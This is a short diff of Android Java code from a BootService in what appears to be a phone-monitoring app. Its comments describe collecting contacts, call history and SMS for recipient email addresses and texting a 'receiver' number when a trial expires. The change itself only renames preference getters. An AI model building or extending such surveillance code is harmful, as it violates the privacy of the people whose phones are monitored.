@@ -83,7 +83,7 @@ public class BootService extends Service
 		
 		// Start timer to get contacts, phone call history and SMS
 		Context context = getApplicationContext();
-		String[] mails = GlobalPrefActivity.getMail(context).split(",");
+		String[] mails = GlobalPrefActivity.getReceiverMail(context).split(",");
 		mails = StrUtils.filterMails(mails);
 		if (mails.length <= 0) return;
 		
@@ -117,7 +117,7 @@ public class BootService extends Service
 			if (ConfigCtrl.getHasSentExpireSms(context)) return;
 			
 			// Send a SMS to the receiver that has expired
-			String receiverPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
+			String receiverPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
 			if (receiverPhoneNum != null && receiverPhoneNum.length() > 0) {
 				String msg = String.format(context.getResources().getString(R.string.msg_has_sent_trial_expire_sms), ConfigCtrl.getSelfName(context));
 				boolean ret = SmsCtrl.sendSms(receiverPhoneNum, msg);
